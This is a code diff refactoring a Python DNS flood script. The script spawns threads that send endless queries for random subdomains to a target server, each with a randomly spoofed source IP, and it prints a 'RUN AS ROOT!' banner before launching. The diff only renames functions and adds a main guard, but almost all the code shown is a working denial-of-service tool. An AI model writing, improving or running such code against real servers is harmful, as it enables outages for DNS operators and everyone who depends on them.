@@ -19,12 +19,12 @@ def perform_query(dns, domain, sourceIP):
     send(packet)
 
 # randomized Domain
-def getRandDomain():
+def get_rand_domain():
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(6))
 
 # randomized IP
-def getRandomIP():
+def get_random_IP():
     genIP = f"{random.randint(1,250)}.{random.randint(1,250)}.{random.randint(1,250)}.{random.randint(1,250)}"
     return genIP
 
@@ -32,23 +32,24 @@ def getRandomIP():
 def flood(): 
     while True:
         global answ
-        domainToUse = getRandDomain()
-        ipToUse = getRandomIP()
+        domainToUse = get_rand_domain()
+        ipToUse = get_random_IP()
         try:
             answ = perform_query(args.server, f"{domainToUse}.com", ipToUse)
         except:
-            domainToUse = getRandDomain()
+            domainToUse = get_rand_domain()
 
 # start threads
-def startThreads():
+def start_threads():
     threads = int(args.threads)
     for i in range(1,threads):
         t = threading.Thread(target=flood)
         t.start()
 
 # start here
-print("RUN AS ROOT!")
-sleep(2)
-print(f"Starting Flood of {args.server} with {args.threads} Threads in 3 seconds ...")
-sleep(3)
-startThreads()
+if __name__ == "__main__":
+    print("RUN AS ROOT!")
+    sleep(2)
+    print(f"Starting Flood of {args.server} with {args.threads} Threads in 3 seconds ...")
+    sleep(3)
+    start_threads()
